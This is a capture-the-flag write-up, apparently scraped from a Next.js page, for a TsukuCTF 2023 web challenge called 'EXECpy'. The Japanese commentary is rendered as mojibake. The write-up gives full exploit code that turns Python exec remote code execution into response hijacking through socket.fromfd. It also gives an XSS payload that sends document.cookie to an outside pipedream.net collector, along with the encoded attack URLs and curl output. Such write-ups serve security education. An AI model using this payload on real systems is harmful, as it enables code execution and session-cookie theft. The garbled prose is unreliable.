\u003c/p\u003e\n~~~\n```\n\n`Server`ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã¯`nginx/1.25.3`ã§ã‚ã‚‹ã®ã§`Tsukushi/2.94`ã§ã¯ãªã„ã€‚\\\nã¾ãŸã€`ğŸ¤ª`ã‚‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã«å«ã¾ã‚Œã¦ã„ã‚‹ã€‚\\\nã“ã‚Œã‚‰ãŒãªã‘ã‚Œã°`request.cookies.get`ã§å–å¾—ã—ãŸãƒ•ãƒ©ã‚°ã‚’å¤–éƒ¨ã«é€ä¿¡ã™ã‚‹ã ã‘ã§æ¸ˆã‚€(`/bin/*`ãŒç„¡ã„ãŒ)ã€‚\\\nä»¥ä¸Šã®ã“ã¨ã‚ˆã‚Šexecã‚’è¡Œã†ã“ã¨ã§Flaskã®å¿œç­”çµæœã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã‚’æ›¸ãæ›ãˆã¦XSSã™ã‚‹å•é¡Œã ã¨ã‚ã‹ã‚‹ã€‚\\\nã“ã“ã§execãŒHTTPé€šä¿¡ä¸­ã«è¡Œã‚ã‚Œã‚‹ãŸã‚ã€Flask(ã‹Werkzeug)ãŒfdã‚’ä¿æŒã—ã¦ãŠã‚Šã€ãã“ã«ãƒ‡ãƒ¼ã‚¿ã‚’æµã—è¾¼ã‚€ã“ã¨ã§ã†ã¾ããƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ããã†ãªã“ã¨ã«æ°—ã¥ãã€‚\\\nã‚‚ã—ãã¯ã€execã§è‡ªç”±åº¦ãŒé«˜ã„ã®ã§Pythonã®ãƒ¡ãƒ¢ãƒªä¸Šã«ä¹—ã£ã¦ã„ã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ã‚‚ã§ãã‚‹ã‹ã‚‚ã—ã‚Œãªã„ã€‚\\\nå¾Œè€…ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç ´å£Šã—ãã†ãªã®ã§ã€å‰è€…ã‚’è©¦ã™ã€‚\\\nFlask(ã‹Werkzeug)ãŒfdã«æ›¸ãè¾¼ã‚“ã§ã„ãªã„ã‹ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª¿æŸ»ã™ã‚‹ã€‚\\\n[Flask Source Code](https://github.com/search?q=repo%3Apallets%2Fflask%20file%20descriptor\\\u0026type=code)\\\n[Werkzeug Source Code](https://github.com/search?q=repo%3Apallets%2Fwerkzeug%20file%20descriptor\\\u0026type=code)\\\nã“ã‚Œã‚‰ã‚’è¦‹ã‚‹ã¨[`socket.fromfd`ã®ç®‡æ‰€](https://github.com/pallets/werkzeug/blob/eafbed0ce2a6bdf60e62de82bf4a8365188ac334/src/werkzeug/serving.py#L778)ãŒä½¿ãˆãã†ãªã“ã¨ãŒã‚ã‹ã‚‹ã€‚\\\n[ã“ã“](https://docs.python.org/3/library/socket.html#socket.fromfd)ã‚’è¦‹ã‚‹ã¨ã™ã§ã«ã‚ã‚‹ã‚½ã‚±ãƒƒãƒˆå‚ç…§ã®fdã‹ã‚‰ã‚½ã‚±ãƒƒãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œã£ã¦ãã‚Œã‚‹ã‚‰ã—ã„ã“ã¨ãŒã‚ã‹ã‚‹ã€‚\\\nã“ã‚Œã‚’ç”¨ã„ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æµã—è¾¼ã‚“ã§ã¿ã‚‹ã€‚\n\n```python\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nContent-Length: 6\nContent-Type: text/html\nConnection: Closed\n\nSatoki''')\n    except Exception as e:\n        pass\n```\n\nå®Ÿè¡Œã™ã‚‹ã€‚\n\n```bash\n$ curl 'http://118.27.109.12:31416/?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass' -v\n*   Trying 118.27.109.12:31416...\n* Connected to 118.27.109.12 (118.27.109.12) port 31416 (#0)\n\u003e GET /?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass HTTP/1.1\n\u003e Host: 118.27.109.12:31416\n\u003e User-Agent: curl/7.81.0\n\u003e Accept: */*\n\u003e\n* Mark bundle as not supporting multiuse\n\u003c HTTP/1.1 200 OK\n\u003c Server: nginx/1.25.3\n\u003c Date: Sat, 09 Dec 2023 00:00:00 GMT\n\u003c Content-Type: text/html\n\u003c Content-Length: 6\n\u003c Connection: close\n\u003c\n* Closing connection 0\nSatoki\n```\n\nç„¡äº‹ã«å¿œç­”ã‚’æ›¸ãæ›ãˆã‚‹ã“ã¨ãŒã§ããŸã€‚\\\nã‚ã¨ã¯é©åˆ‡ãªãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®šã—ã€XSSã—ã¦ãƒ•ãƒ©ã‚°ã‚’å¤–éƒ¨ã‚µãƒ¼ãƒã«é€ä¿¡ã—ã¦ã‚„ã‚Œã°ã‚ˆã„ã€‚\\\nä»¥ä¸‹ã®payload.pyã§XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä½œæˆã‚’è¡Œã†ã€‚\n\n```python\n# This script is inspired by potetisensei\n\nURL = \"https://en9i5fcxybxwa.x.pipedream.net/\" # Your server\n\npayload = f\"\"\"\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n    \u003chead\u003e\u003c/head\u003e\n    \u003cbody\u003e\n    \u003cscript\u003elocation.href='{URL}?s='+document.cookie\u003c/script\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n\"\"\"\n\nprint(\n    f\"\"\"\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nServer: Tsukushi/2.94\nContent-Length: {len(payload)}\nContent-Type: text/html\nConnection: Closed\n\n{payload}''')\n    except Exception as e:\n        pass\n\"\"\"\n)\n```\n\nå®Ÿè¡Œã™ã‚‹ã€‚\n\n```bash\n$ python payload.py\n\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nServer: Tsukushi/2.94\nContent-Length: 178\nContent-Type: text/html\nConnection: Closed\n\n\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n    \u003chead\u003e\u003c/head\u003e\n    \u003cbody\u003e\n    \u003cscript\u003elocation.href='https://en9i5fcxybxwa.x.pipedream.net/?s='+document.cookie\u003c/script\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n''')\n    except Exception as e:\n        pass\n\n```\n\nã“ã‚Œã‚’URLã‚¯ã‚¨ãƒªã«è¨­å®šã™ã‚‹ã¨ä»¥ä¸‹ã«ãªã‚‹ã€‚\n\n```\nhttp://118.27.109.12:31416/?code=%0D%0Aimport+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AServer%3A+Tsukushi%2F2.94%0D%0AContent-Length%3A+178%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0A%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22en%22%3E%0D%0A++++%3Chead%3E%3C%2Fhead%3E%0D%0A++++%3Cbody%3E%0D%0A++++%3Cscript%3Elocation.href%3D%27https%3A%2F%2Fen9i5fcxybxwa.x.pipedream.net%2F%3Fs%3D%27%2Bdocument.cookie%3C%2Fscript%3E%0D%0A++++%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass%0D%0A\n```\n\ncrawlerã«æŠ•ã’ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒå±Šãã€‚\\\n![flag.png](images/flag.png)\\\nflagãŒå¾—ã‚‰ã‚ŒãŸã€‚\n\n## TsukuCTF23{175\\_4\\_73rr1bl3\\_4774ck\\_70\\_1n73rrup7\\_h77p}\n","title":"EXECpy","description":"RCE2XSS","author":"satoki00","genre":"web","solver":15,"point":499}},"__N_SSG":true},"page":"/ctf/TsukuCTF2023/[id]","query":{"id":"EXECpy"},"buildId":"0Onlp1ZUa7LUgmSD0AeGE","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>